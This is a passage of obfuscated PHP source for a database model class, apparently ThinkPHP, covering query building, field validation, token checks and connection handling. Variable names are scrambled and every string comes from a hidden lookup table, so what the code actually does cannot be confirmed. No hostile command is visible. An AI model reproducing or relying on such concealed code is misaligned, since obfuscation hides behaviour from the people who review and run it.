array(); if (isset($Œ–›æ¸)) { $ÔÌüä¬í[$¶§ºÍÒÊ] = $Œ–›æ¸; } $this->_after_delete($ÔÌüä¬í, $Ëùç©ğ); } return $ÛÔ˜¿Ó×; } protected function _after_delete($§ğúàö, $¥¹À¤§ú) { } public function select($öé£ºşñ = array()) { $’ À…üÏ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($öé£ºşñ) || is_numeric($öé£ºşñ)) { $ƒşüøÖÖ = $this->getPk(); if (strpos($öé£ºşñ, $’ À…üÏ[50])) { $íŞéŒÅã[$ƒşüøÖÖ] = array($’ À…üÏ[276], $öé£ºşñ); } else { $íŞéŒÅã[$ƒşüøÖÖ] = $öé£ºşñ; } $this->options[$’ À…üÏ[275]] = $íŞéŒÅã; } elseif (!1 === $öé£ºşñ) { $öé£ºşñ = $this->_parseOptions(); return $’ À…üÏ[277] . $this->db->buildSelectSql($öé£ºşñ) . $’ À…üÏ[278]; } $öé£ºşñ = $this->_parseOptions(); $¦÷èÇä = $this->db->select($öé£ºşñ); if (!1 === $¦÷èÇä) { return !1; } if (empty($¦÷èÇä)) { return null; } $this->_afterSelect($¦÷èÇä, $öé£ºşñ); return $¦÷èÇä; } protected function _afterSelect(&$ßÖÇ¸Ÿİ, $”öŒÙ¢) { } public function buildSql($¼Î—ìî = array()) { $Ş“ˆ¯ªŸ =& $_SERVER[ùÆÎÔ“Ñ]; $¼Î—ìî = $this->_parseOptions($¼Î—ìî); return $Ş“ˆ¯ªŸ[277] . $this->db->buildSelectSql($¼Î—ìî) . $Ş“ˆ¯ªŸ[278]; } public function optionsValue($Ú±ú’õ = null) { if (is_null($Ú±ú’õ)) { return $this->options; } elseif (is_array($Ú±ú’õ)) { $this->options = array_merge($this->options, $Ú±ú’õ); } } protected function _parseOptions($‡Ã‘äùƒ = array()) { $ŒÄŸ¿Æ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_array($‡Ã‘äùƒ)) { $‡Ã‘äùƒ = array_merge($this->options, $‡Ã‘äùƒ); } $this->options = array(); if (!isset($‡Ã‘äùƒ[$ŒÄŸ¿Æ[279]])) { $‡Ã‘äùƒ[$ŒÄŸ¿Æ[279]] = $this->getTableName(); $»ººüÁ = $this->fields; } else { $»ººüÁ = $this->getDbFields(); } if (!empty($‡Ã‘äùƒ[$ŒÄŸ¿Æ[280]])) { $‡Ã‘äùƒ[$ŒÄŸ¿Æ[279]] .= $ŒÄŸ¿Æ[53] . $‡Ã‘äùƒ[$ŒÄŸ¿Æ[280]]; } $‡Ã‘äùƒ[$ŒÄŸ¿Æ[281]] = $this->name; if (isset($‡Ã‘äùƒ[$ŒÄŸ¿Æ[275]]) && is_array($‡Ã‘äùƒ[$ŒÄŸ¿Æ[275]]) && !empty($»ººüÁ) && !isset($‡Ã‘äùƒ[$ŒÄŸ¿Æ[282]]) && !isset($‡Ã‘äùƒ[$ŒÄŸ¿Æ[279]])) { foreach ($‡Ã‘äùƒ[$ŒÄŸ¿Æ[275]] as $â£÷İ•Â => $Áç…ªº†) { $â£÷İ•Â = trim($â£÷İ•Â); if (in_array($â£÷İ•Â, $»ººüÁ, !0)) { if (is_scalar($Áç…ªº†)) { $this->_parseType($‡Ã‘äùƒ[$ŒÄŸ¿Æ[275]], $â£÷İ•Â); } } elseif (!is_numeric($â£÷İ•Â) && $ŒÄŸ¿Æ[11] != substr($â£÷İ•Â, 0, 1) && !1 === strpos($â£÷İ•Â, $ŒÄŸ¿Æ[10]) && !1 === strpos($â£÷İ•Â, $ŒÄŸ¿Æ[260]) && !1 === strpos($â£÷İ•Â, $ŒÄŸ¿Æ[283]) && !1 === strpos($â£÷İ•Â, $ŒÄŸ¿Æ[284])) { unset($‡Ã‘äùƒ[$ŒÄŸ¿Æ[275]][$â£÷İ•Â]); } } } $this->_options_filter($‡Ã‘äùƒ); return $‡Ã‘äùƒ; } protected function _options_filter(&$õ¶­³ù’) { } protected function _parseType(&$»À­°Æ, $Æ¢è¥„÷) { $ğ¨››¦» =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($this->options[$ğ¨››¦»[285]][$ğ¨››¦»[4] . $Æ¢è¥„÷])) { $ó½÷í‰ = strtolower($this->fields[$ğ¨››¦»[252]][$Æ¢è¥„÷]); if (!1 !== strpos($ó½÷í‰, $ğ¨››¦»[286])) { } elseif (!1 === strpos($ó½÷í‰, $ğ¨››¦»[287]) && !1 !== strpos($ó½÷í‰, $ğ¨››¦»[288])) { $»À­°Æ[$Æ¢è¥„÷] = intval($»À­°Æ[$Æ¢è¥„÷]); } elseif (!1 !== strpos($ó½÷í‰, $ğ¨››¦»[289]) || !1 !== strpos($ó½÷í‰, $ğ¨››¦»[290])) { $»À­°Æ[$Æ¢è¥„÷] = floatval($»À­°Æ[$Æ¢è¥„÷]); } elseif (!1 !== strpos($ó½÷í‰, $ğ¨››¦»[291])) { $»À­°Æ[$Æ¢è¥„÷] = (bool) $»À­°Æ[$Æ¢è¥„÷]; } } } public function find($ŞÂÂË€ = array()) { $÷õ–ûŠÚ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_numeric($ŞÂÂË€) || is_string($ŞÂÂË€)) { $ğ’³š’Ã[$this->getPk()] = intval($ŞÂÂË€); $this->options[$÷õ–ûŠÚ[275]] = $ğ’³š’Ã; } $this->options[$÷õ–ûŠÚ[292]] = 1; $ŞÂÂË€ = $this->_parseOptions(); $¢àŠ§ØŠ = $this->db->select($ŞÂÂË€); if (!1 === $¢àŠ§ØŠ) { return !1; } if (empty($¢àŠ§ØŠ)) { return null; } $this->data = $¢àŠ§ØŠ[0]; $this->_afterFind($this->data, $ŞÂÂË€); if (!empty($this->options[$÷õ–ûŠÚ[293]])) { return $this->returnResult($this->data, $this->options[$÷õ–ûŠÚ[293]]); } return $this->data; } protected function _afterFind(&$ÍÏ›à‡Ù, $ŸŸ¹ÌÂÚ) { } protected function returnResult($Šşí…Ç½, $»ïÖ¡¶õ = '') { $‰Ë‘ëéÂ =& $_SERVER[ùÆÎÔ“Ñ]; if ($»ïÖ¡¶õ) { if (is_callable($»ïÖ¡¶õ)) { return call_user_func($»ïÖ¡¶õ, $Šşí…Ç½); } switch (strtolower($»ïÖ¡¶õ)) { case $‰Ë‘ëéÂ[294]: return json_encode($Šşí…Ç½); case $‰Ë‘ëéÂ[295]: return xml_encode($Šşí…Ç½); } } return $Šşí…Ç½; } public function parseFieldsMap($î˜„¸¤, $ƒ‹Ô¥– = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¥Ïø°Â => $ı×‚È—) { if ($ƒ‹Ô¥– == 1) { if (isset($î˜„¸¤[$ı×‚È—])) { $î˜„¸¤[$¥Ïø°Â] = $î˜„¸¤[$ı×‚È—]; unset($î˜„¸¤[$ı×‚È—]); } } else { if (isset($î˜„¸¤[$¥Ïø°Â])) { $î˜„¸¤[$ı×‚È—] = $î˜„¸¤[$¥Ïø°Â]; unset($î˜„¸¤[$¥Ïø°Â]); } } } } return $î˜„¸¤; } public function setField($ ÂŒ„ê±, $åß¹–’Å = '') { if (is_array($ ÂŒ„ê±)) { $şúÌÅäµ = $ ÂŒ„ê±; } else { $şúÌÅäµ[$ ÂŒ„ê±] = $åß¹–’Å; } return $this->save($şúÌÅäµ); } public function setAdd($¼Ÿµ”ıö, $³ß“ò¥ü = 1) { $ğÄ½à¥˜ =& $_SERVER[ùÆÎÔ“Ñ]; $“¢ğî—÷ = $¼Ÿµ”ıö . $ğÄ½à¥˜[296] . $³ß“ò¥ü; if ($³ß“ò¥ü < 0) { $“¢ğî—÷ = $¼Ÿµ”ıö . $³ß“ò¥ü; } return $this->setField($¼Ÿµ”ıö, array($ğÄ½à¥˜[297], $“¢ğî—÷)); } public function getField($²›äåØ, $’ÎÃ¼ÂÎ = null) { $…¨ˆÉİ =& $_SERVER[ùÆÎÔ“Ñ]; $ãƒèÂİ‹[$…¨ˆÉİ[273]] = $²›äåØ; $ãƒèÂİ‹ = $this->_parseOptions($ãƒèÂİ‹); $²›äåØ = trim($²›äåØ); if (strpos($²›äåØ, $…¨ˆÉİ[50])) { if (!isset($ãƒèÂİ‹[$…¨ˆÉİ[292]])) { $ãƒèÂİ‹[$…¨ˆÉİ[292]] = is_numeric($’ÎÃ¼ÂÎ) ? $’ÎÃ¼ÂÎ : $…¨ˆÉİ[12]; } $ƒ½éÉŸ = $this->db->select($ãƒèÂİ‹); if (!empty($ƒ½éÉŸ)) { $ÜŒ´õ = explode($…¨ˆÉİ[50], $²›äåØ); $²›äåØ = array_keys($ƒ½éÉŸ[0]); $ƒüøÑ³ = array_shift($²›äåØ); $Ëƒß¬ˆ = array_shift($²›äåØ); $¾±İ’³ê = array(); $Å¶‹Î›Å = count($ÜŒ´õ); foreach ($ƒ½éÉŸ as $è®ë×Æ) { $Éøû« = $è®ë×Æ[$ƒüøÑ³]; if (2 == $Å¶‹Î›Å) { $¾±İ’³ê[$Éøû«] = $è®ë×Æ[$Ëƒß¬ˆ]; } else { $¾±İ’³ê[$Éøû«] = is_string($’ÎÃ¼ÂÎ) ? implode($’ÎÃ¼ÂÎ, $è®ë×Æ) : $è®ë×Æ; } } return $¾±İ’³ê; } } else { if (!0 !== $’ÎÃ¼ÂÎ) { $ãƒèÂİ‹[$…¨ˆÉİ[292]] = is_numeric($’ÎÃ¼ÂÎ) ? $’ÎÃ¼ÂÎ : 1; } if ($’ÎÃ¼ÂÎ === $…¨ˆÉİ[255]) { unset($ãƒèÂİ‹[$…¨ˆÉİ[292]]); } $è®ë×Æ = $this->db->select($ãƒèÂİ‹); if (!empty($è®ë×Æ)) { if ($’ÎÃ¼ÂÎ === $…¨ˆÉİ[255]) { return reset($è®ë×Æ[0]); } if (!0 !== $’ÎÃ¼ÂÎ && 1 == $ãƒèÂİ‹[$…¨ˆÉİ[292]]) { return reset($è®ë×Æ[0]); } foreach ($è®ë×Æ as $ÆÅÏô›¯) { $¤ÒŠºê[] = $ÆÅÏô›¯[$²›äåØ]; } return $¤ÒŠºê; } } return null; } public function create($ÀìÒø¢£ = '', $¹Óô¡‹Í = '') { $¾È˜ò¯¢ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($ÀìÒø¢£)) { $ÀìÒø¢£ = $_POST; } elseif (is_object($ÀìÒø¢£)) { $ÀìÒø¢£ = get_object_vars($ÀìÒø¢£); } if (empty($ÀìÒø¢£) || !is_array($ÀìÒø¢£)) { $this->error = think_lang($¾È˜ò¯¢[271]); return !1; } $ÀìÒø¢£ = $this->parseFieldsMap($ÀìÒø¢£, 0); $¹Óô¡‹Í = $¹Óô¡‹Í ? $¹Óô¡‹Í : (!empty($ÀìÒø¢£[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¾È˜ò¯¢[273]])) { $µƒ“Å´£ = $this->options[$¾È˜ò¯¢[273]]; unset($this->options[$¾È˜ò¯¢[273]]); } elseif ($¹Óô¡‹Í == THINK_MODEL_INSERT && isset($this->insertFields)) { $µƒ“Å´£ = $this->insertFields; } elseif ($¹Óô¡‹Í == THINK_MODEL_UPDATE && isset($this->updateFields)) { $µƒ“Å´£ = $this->updateFields; } if (isset($µƒ“Å´£)) { if (is_string($µƒ“Å´£)) { $µƒ“Å´£ = explode($¾È˜ò¯¢[50], $µƒ“Å´£); } if (think_config($¾È˜ò¯¢[298])) { $µƒ“Å´£[] = think_config($¾È˜ò¯¢[299]); } foreach ($ÀìÒø¢£ as $Ëç¨ïğ¬ => $‰Ã›¶¼³) { if (!in_array($Ëç¨ïğ¬, $µƒ“Å´£)) { unset($ÀìÒø¢£[$Ëç¨ïğ¬]); } } } if (!$this->autoValidation($ÀìÒø¢£, $¹Óô¡‹Í)) { return !1; } if (!$this->autoCheckToken($ÀìÒø¢£)) { $this->error = think_lang($¾È˜ò¯¢[300]); return !1; } if ($this->autoCheckFields) { $µƒ“Å´£ = $this->getDbFields(); foreach ($ÀìÒø¢£ as $Ëç¨ïğ¬ => $‰Ã›¶¼³) { if (!in_array($Ëç¨ïğ¬, $µƒ“Å´£)) { unset($ÀìÒø¢£[$Ëç¨ïğ¬]); } elseif (MAGIC_QUOTES_GPC && is_string($‰Ã›¶¼³)) { $ÀìÒø¢£[$Ëç¨ïğ¬] = stripslashes($‰Ã›¶¼³); } } } $this->autoOperation($ÀìÒø¢£, $¹Óô¡‹Í); $this->data = $ÀìÒø¢£; return $ÀìÒø¢£; } public function autoCheckToken($¸ßËÃè) { $÷„³¢‹ı =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($this->options[$÷„³¢‹ı[301]]) && !$this->options[$÷„³¢‹ı[301]]) { return !0; } if (think_config($÷„³¢‹ı[298])) { $Âßû µ = think_config($÷„³¢‹ı[299]); if (!isset($¸ßËÃè[$Âßû µ]) || Session::get($Âßû µ)) { return !1; } list($ÍïùŠ”ì, $«şšû–ú) = explode($÷„³¢‹ı[11], $¸ßËÃè[$Âßû µ]); if ($«şšû–ú && Session::get($Âßû µ . $÷„³¢‹ı[10] . $ÍïùŠ”ì) === $«şšû–ú) { Session::remove($Âßû µ . $÷„³¢‹ı[10] . $ÍïùŠ”ì); return !0; } if (think_config($÷„³¢‹ı[302])) { Session::remove($Âßû µ . $÷„³¢‹ı[10] . $ÍïùŠ”ì); } return !1; } return !0; } public function regex($±£â–¯ö, $œ½ü«©) { $š×ì¼½ =& $_SERVER[ùÆÎÔ“Ñ]; $°ø‚ø¨ä = array($š×ì¼½[303] => $š×ì¼½[304], $š×ì¼½[305] => $š×ì¼½[306], $š×ì¼½[307] => $š×ì¼½[308], $š×ì¼½[309] => $š×ì¼½[310], $š×ì¼½[311] => $š×ì¼½[312], $š×ì¼½[313] => $š×ì¼½[314], $š×ì¼½[315] => $š×ì¼½[316], $š×ì¼½[290] => $š×ì¼½[317], $š×ì¼½[318] => $š×ì¼½[319]); if (isset($°ø‚ø¨ä[strtolower($œ½ü«©)])) { $œ½ü«© = $°ø‚ø¨ä[strtolower($œ½ü«©)]; } return preg_match($œ½ü«©, $±£â–¯ö) === 1; } private function autoOperation(&$şæ´“…µ, $ˆ‘¡£ØÜ) { $›åèÃ¯ =& $_SERVER[ùÆÎÔ“Ñ]; if (!empty($this->options[$›åèÃ¯[320]])) { $ñÛ›İùÙ = $this->options[$›åèÃ¯[320]]; unset($this->options[$›åèÃ¯[320]]); } elseif (!empty($this->_auto)) { $ñÛ›İùÙ = $this->_auto; } if (isset($ñÛ›İùÙ)) { foreach ($ñÛ›İùÙ as $¼ÖªÃñ¼) { if (empty($¼ÖªÃñ¼[2])) { $¼ÖªÃñ¼[2] = THINK_MODEL_INSERT; } if ($ˆ‘¡£ØÜ == $¼ÖªÃñ¼[2] || $¼ÖªÃñ¼[2] == THINK_MODEL_BOTH) { switch (trim($¼ÖªÃñ¼[3])) { case $›åèÃ¯[321]: case $›åèÃ¯[322]: $Ñ—Ô‘Óõ = isset($¼ÖªÃñ¼[4]) ? (array) $¼ÖªÃñ¼[4] : array(); if (isset($şæ´“…µ[$¼ÖªÃñ¼[0]])) { array_unshift($Ñ—Ô‘Óõ, $şæ´“…µ[$¼ÖªÃñ¼[0]]); } if ($›åèÃ¯[321] == $¼ÖªÃñ¼[3]) { $şæ´“…µ[$¼ÖªÃñ¼[0]] = call_user_func_array($¼ÖªÃñ¼[1], $Ñ—Ô‘Óõ); } else { $şæ´“…µ[$¼ÖªÃñ¼[0]] = call_user_func_array(array(&$this, $¼ÖªÃñ¼[1]), $Ñ—Ô‘Óõ); } break; case $›åèÃ¯[273]: $şæ´“…µ[$¼ÖªÃñ¼[0]] = $şæ´“…µ[$¼ÖªÃñ¼[1]]; break; case $›åèÃ¯[323]: if ($›åèÃ¯[12] === $şæ´“…µ[$¼ÖªÃñ¼[0]]) { unset($şæ´“…µ[$¼ÖªÃñ¼[0]]); } break; case $›åèÃ¯[324]: default: $şæ´“…µ[$¼ÖªÃñ¼[0]] = $¼ÖªÃñ¼[1]; } if (!1 === $şæ´“…µ[$¼ÖªÃñ¼[0]]) { unset($şæ´“…µ[$¼ÖªÃñ¼[0]]); } } } } return $şæ´“…µ; } protected function autoValidation($û†ÍÓ®, $ö¯×Šøô) { $üó÷§Æ =& $_SERVER[ùÆÎÔ“Ñ]; if (!empty($this->options[$üó÷§Æ[325]])) { $¶îÍÊŒ = $this->options[$üó÷§Æ[325]]; unset($this->options[$üó÷§Æ[325]]); } elseif (!empty($this->_validate)) { $¶îÍÊŒ = $this->_validate; } if (isset($¶îÍÊŒ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¶îÍÊŒ as $Æºá„ú© => $¬¯ÙŠ•é) { if (empty($¬¯ÙŠ•é[5]) || $¬¯ÙŠ•é[5] == THINK_MODEL_BOTH || $¬¯ÙŠ•é[5] == $ö¯×Šøô) { if (0 == strpos($¬¯ÙŠ•é[2], $üó÷§Æ[326]) && strpos($¬¯ÙŠ•é[2], $üó÷§Æ[327])) { $¬¯ÙŠ•é[2] = think_lang(substr($¬¯ÙŠ•é[2], 2, -1)); } $¬¯ÙŠ•é[3] = isset($¬¯ÙŠ•é[3]) ? $¬¯ÙŠ•é[3] : THINK_EXISTS_VALIDATE; $¬¯ÙŠ•é[4] = isset($¬¯ÙŠ•é[4]) ? $¬¯ÙŠ•é[4] : $üó÷§Æ[328]; switch ($¬¯ÙŠ•é[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($û†ÍÓ®, $¬¯ÙŠ•é)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($üó÷§Æ[12] != trim($û†ÍÓ®[$¬¯ÙŠ•é[0]])) { if (!1 === $this->_validationField($û†ÍÓ®, $¬¯ÙŠ•é)) { return !1; } } break; default: if (isset($û†ÍÓ®[$¬¯ÙŠ•é[0]])) { if (!1 === $this->_validationField($û†ÍÓ®, $¬¯ÙŠ•é)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($²›ïùáä, $ñ×Ë) { if (!1 === $this->_validationFieldItem($²›ïùáä, $ñ×Ë)) { if ($this->patchValidate) { $this->error[$ñ×Ë[0]] = $ñ×Ë[2]; } else { $this->error = $ñ×Ë[2]; return !1; } } return; } protected function _validationFieldItem($î«Í˜ôœ, $Å‡Ÿ›) { $Ùã€Šô¢ =& $_SERVER[ùÆÎÔ“Ñ]; switch (strtolower(trim($Å‡Ÿ›[4]))) { case $Ùã€Šô¢[321]: case $Ùã€Šô¢[322]: $í¶¬ïÊ = isset($Å‡Ÿ›[6]) ? (array) $Å‡Ÿ›[6] : array(); if (is_string($Å‡Ÿ›[0]) && strpos($Å‡Ÿ›[0], $Ùã€Šô¢[50])) { $Å‡Ÿ›[0] = explode($Ùã€Šô¢[50], $Å‡Ÿ›[0]); } if (is_array($Å‡Ÿ›[0])) { foreach ($Å‡Ÿ›[0] as $•¦×ñÉç) { $Ö»±ñ»æ[$•¦×ñÉç] = $î«Í˜ôœ[$•¦×ñÉç]; } array_unshift($í¶¬ïÊ, $Ö»±ñ»æ); } else { array_unshift($í¶¬ïÊ, $î«Í˜ôœ[$Å‡Ÿ›[0]]); } if ($Ùã€Šô¢[321] == $Å‡Ÿ›[4]) { return call_user_func_array($Å‡Ÿ›[1], $í¶¬ïÊ); } else { return call_user_func_array(array(&$this, $Å‡Ÿ›[1]), $í¶¬ïÊ); } case $Ùã€Šô¢[329]: return $î«Í˜ôœ[$Å‡Ÿ›[0]] == $î«Í˜ôœ[$Å‡Ÿ›[1]]; case $Ùã€Šô¢[330]: if (is_string($Å‡Ÿ›[0]) && strpos($Å‡Ÿ›[0], $Ùã€Šô¢[50])) { $Å‡Ÿ›[0] = explode($Ùã€Šô¢[50], $Å‡Ÿ›[0]); } $Œş‘Š¦ = array(); if (is_array($Å‡Ÿ›[0])) { foreach ($Å‡Ÿ›[0] as $•¦×ñÉç) { $Œş‘Š¦[$•¦×ñÉç] = $î«Í˜ôœ[$•¦×ñÉç]; } } else { $Œş‘Š¦[$Å‡Ÿ›[0]] = $î«Í˜ôœ[$Å‡Ÿ›[0]]; } if (!empty($î«Í˜ôœ[$this->getPk()])) { $Œş‘Š¦[$this->getPk()] = array($Ùã€Šô¢[331], $î«Í˜ôœ[$this->getPk()]); } if ($this->where($Œş‘Š¦)->find()) { return !1; } return !0; default: return $this->check($î«Í˜ôœ[$Å‡Ÿ›[0]], $Å‡Ÿ›[1], $Å‡Ÿ›[4]); } } public function check($ÎïøòÒÅ, $œ¦¾‰ˆ–, $´ìÀÄª‰ = "\x72\x65\x67\145\170") { $£µÛô¶ =& $_SERVER[ùÆÎÔ“Ñ]; $´ìÀÄª‰ = strtolower(trim($´ìÀÄª‰)); switch ($´ìÀÄª‰) { case $£µÛô¶[7]: case $£µÛô¶[332]: $«±¦§ÂÏ = is_array($œ¦¾‰ˆ–) ? $œ¦¾‰ˆ– : explode($£µÛô¶[50], $œ¦¾‰ˆ–); return $´ìÀÄª‰ == $£µÛô¶[7] ? in_array($ÎïøòÒÅ, $«±¦§ÂÏ) : !in_array($ÎïøòÒÅ, $«±¦§ÂÏ); case $£µÛô¶[333]: case $£µÛô¶[334]: if (is_array($œ¦¾‰ˆ–)) { $ˆŠ±²È = $œ¦¾‰ˆ–[0]; $àÓ¯Î‰ı = $œ¦¾‰ˆ–[1]; } else { list($ˆŠ±²È, $àÓ¯Î‰ı) = explode($£µÛô¶[50], $œ¦¾‰ˆ–); } return $´ìÀÄª‰ == $£µÛô¶[333] ? $ÎïøòÒÅ >= $ˆŠ±²È && $ÎïøòÒÅ <= $àÓ¯Î‰ı : $ÎïøòÒÅ < $ˆŠ±²È || $ÎïøòÒÅ > $àÓ¯Î‰ı; case $£µÛô¶[335]: case $£µÛô¶[336]: return $´ìÀÄª‰ == $£µÛô¶[335] ? $ÎïøòÒÅ == $œ¦¾‰ˆ– : $ÎïøòÒÅ != $œ¦¾‰ˆ–; case $£µÛô¶[337]: $â¡®õ³ = mb_strlen($ÎïøòÒÅ, $£µÛô¶[338]); if (strpos($œ¦¾‰ˆ–, $£µÛô¶[50])) { list($ˆŠ±²È, $àÓ¯Î‰ı) = explode($£µÛô¶[50], $œ¦¾‰ˆ–); return $â¡®õ³ >= $ˆŠ±²È && $â¡®õ³ <= $àÓ¯Î‰ı; } else { return $â¡®õ³ == $œ¦¾‰ˆ–; } case $£µÛô¶[339]: list($Æ“†º, $°¦à‘‰) = explode($£µÛô¶[50], $œ¦¾‰ˆ–); if (!is_numeric($Æ“†º)) { $Æ“†º = strtotime($Æ“†º); } if (!is_numeric($°¦à‘‰)) { $°¦à‘‰ = strtotime($°¦à‘‰); } return NOW_TIME >= $Æ“†º && NOW_TIME <= $°¦à‘‰; case $£µÛô¶[340]: return in_array(get_client_ip(), explode($£µÛô¶[50], $œ¦¾‰ˆ–)); case $£µÛô¶[341]: return !in_array(get_client_ip(), explode($£µÛô¶[50], $œ¦¾‰ˆ–)); case $£µÛô¶[328]: default: return $this->regex($ÎïøòÒÅ, $œ¦¾‰ˆ–); } } public function query($¨ûî÷ñí, $áÄî±ÓÛ = false) { $ø¸¨± =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_bool($áÄî±ÓÛ) && !is_array($áÄî±ÓÛ)) { $áÄî±ÓÛ = func_get_args(); array_shift($áÄî±ÓÛ); } $¨ûî÷ñí = str_replace(array($ø¸¨±[231], $ø¸¨±[342]), $ø¸¨±[53], $¨ûî÷ñí); $¨ûî÷ñí = $this->parseSql($¨ûî÷ñí, $áÄî±ÓÛ); return $this->db->query($¨ûî÷ñí); } public function execute($³¸³£¬Ë, $Ãò¼ á¡ = false) { if (!is_bool($Ãò¼ á¡) && !is_array($Ãò¼ á¡)) { $Ãò¼ á¡ = func_get_args(); array_shift($Ãò¼ á¡); } $³¸³£¬Ë = $this->parseSql($³¸³£¬Ë, $Ãò¼ á¡); return $this->db->execute($³¸³£¬Ë); } protected function parseSql($ ±–Ò·õ, $ç‹û¦È›) { $ÜÙîî¡ì =& $_SERVER[ùÆÎÔ“Ñ]; if (!0 === $ç‹û¦È›) { $çï€èäÚ = $this->_parseOptions(); $ ±–Ò·õ = $this->db->parseSql($ ±–Ò·õ, $çï€èäÚ); } elseif (is_array($ç‹û¦È›)) { $ç‹û¦È› = array_map(array($this->db, $ÜÙîî¡ì[343]), $ç‹û¦È›); $ ±–Ò·õ = vsprintf($ ±–Ò·õ, $ç‹û¦È›); } else { $ ±–Ò·õ = strtr($ ±–Ò·õ, array($ÜÙîî¡ì[344] => $this->getTableName(), $ÜÙîî¡ì[345] => think_config($ÜÙîî¡ì[244]))); } $this->db->setModel($this->name); return $ ±–Ò·õ; } public function db($º‹Ë² = '', $¼°·¸•¦ = '', $à³ßÜÔà = array()) { $´ÑĞ´£¹ =& $_SERVER[ùÆÎÔ“Ñ]; if ($´ÑĞ´£¹[12] === $º‹Ë² && $this->db) { return $this->db; } static $ã£‘Âµè = array(); static $­ØŸ©µ‡ = array(); if (!isset($­ØŸ©µ‡[$º‹Ë²]) || isset($­ØŸ©µ‡[$º‹Ë²]) && $¼°·¸•¦ && $ã£‘Âµè[$º‹Ë²] != $¼°·¸•¦) { if (!empty($¼°·¸•¦) && is_string($¼°·¸•¦) && !1 === strpos($¼°·¸•¦, $´ÑĞ´£¹[8])) { $¼°·¸•¦ = think_config($¼°·¸•¦); } $º‹Ë² = think_guid($¼°·¸•¦); $­ØŸ©µ‡[$º‹Ë²] = Db::getInstance($¼°·¸•¦); } elseif (NULL === $¼°·¸•¦) { $­ØŸ©µ‡[$º‹Ë²]->close(); unset($­ØŸ©µ‡[$º‹Ë²]); return; } if (!empty($à³ßÜÔà)) { if (is_string($à³ßÜÔà)) { parse_str($à³ßÜÔà, $à³ßÜÔà); } foreach ($à³ßÜÔà as $ŒÍä²½ó => $ä‹·¦Ş¿) { $this->setProperty($ŒÍä²½ó, $ä‹·¦Ş¿); } } $ã£‘Âµè[$º‹Ë²] = $¼°·¸•¦; $this->db = $­ØŸ©µ‡[$º‹Ë²]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ìùñ™¦² = get_class($this); if ($ìùñ™¦² == $_SERVER[ùÆÎÔ“Ñ][346]) { return $this->name; } $this->name = substr($ìùñ™¦², 0, -5); } return $this->name; } public function getTableName() { $ËŞ‹›¾¯ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($this->trueTableName)) { $Äô„·†ò = !empty($this->tablePrefix) ? $this->tablePrefix : $ËŞ‹›¾¯[12]; if (!empty($this->tableName)) { $Äô„·†ò .= $this->tableName; } else { $Äô„·†ò .= think_parse_name($this->name); } $this->trueTableName = strtolower($Äô„·†ò); } return (!empty($this->dbName) ? $this->dbName . $ËŞ‹›¾¯[10] : $ËŞ‹›¾¯[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $à‘Œ‹Ç” =& $_SERVER[ùÆÎÔ“Ñ]; return isset($this->fields[$à‘Œ‹Ç”[251]]) ? $this->fields[$à‘Œ‹Ç”[251]] : $this->pk; } public function getDbFields() { $à×şå¥Ç =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($this->options[$à×şå¥Ç[279]])) { $ã¸Šä„ = $this->db->getFields($this->options[$à×şå¥Ç[279]]); return $ã¸Šä„ ? array_keys($ã¸Šä„) : !1; } if ($this->fields) { $ã¸Šä„ = $this->fields; unset($ã¸Šä„[$à×şå¥Ç[250]], $ã¸Šä„[$à×şå¥Ç[251]], $ã¸Šä„[$à×şå¥Ç[252]], $ã¸Šä„[$à×şå¥Ç[249]]); return $ã¸Šä„; } return !1; } public function data($—È¾ßÑ¥ = '') { $Ë™‰¶øš =& $_SERVER[ùÆÎÔ“Ñ]; if ($Ë™‰¶øš[12] === $—È¾ßÑ¥ && !empty($this->data)) { return $this->data; } if (is_object($—È¾ßÑ¥)) { $—È¾ßÑ¥ = get_object_vars($—È¾ßÑ¥); } elseif (is_string($—È¾ßÑ¥)) { parse_str($—È¾ßÑ¥, $—È¾ßÑ¥); } elseif (!is_array($—È¾ßÑ¥)) { think_exception(think_lang($Ë™‰¶øš[271])); } $this->data = $—È¾ßÑ¥; return $this; } public function join($¬ÁÕ÷‹) { $è¬—ÛÜ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_array($¬ÁÕ÷‹)) { $this->options[$è¬—ÛÜ[282]] = $¬ÁÕ÷‹; } elseif (!empty($¬ÁÕ÷‹)) { $this->options[$è¬—ÛÜ[282]][] = $¬ÁÕ÷‹; } return $this; } public function union($§Àå›®ğ, $ı°§á = false) { $÷ëì»äÔ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($§Àå›®ğ)) { return $this; } if ($ı°§á) { $this->options[$÷ëì»äÔ[347]][$÷ëì»äÔ[348]] = !0; } if (is_object($§Àå›®ğ)) { $§Àå›®ğ = get_object_vars($§Àå›®ğ); } if (is_string($§Àå›®ğ)) { $‡À’¯Ò– = $§Àå›®ğ; } elseif (is_array($§Àå›®ğ)) { if (isset($§Àå›®ğ[0])) { $this->options[$÷ëì»äÔ[347]] = array_merge($this->options[$÷ëì»äÔ[347]], $§Àå›®ğ); return $this; } else { $‡À’¯Ò– = $§Àå›®ğ; } } else { think_exception(think_lang($÷ëì»äÔ[271])); } $this->options[$÷ëì»äÔ[347]][] = $‡À’¯Ò–; return $this; } public function cache($·Àéõ×Ú = true, $ˆÙî‚Ò­ = null, 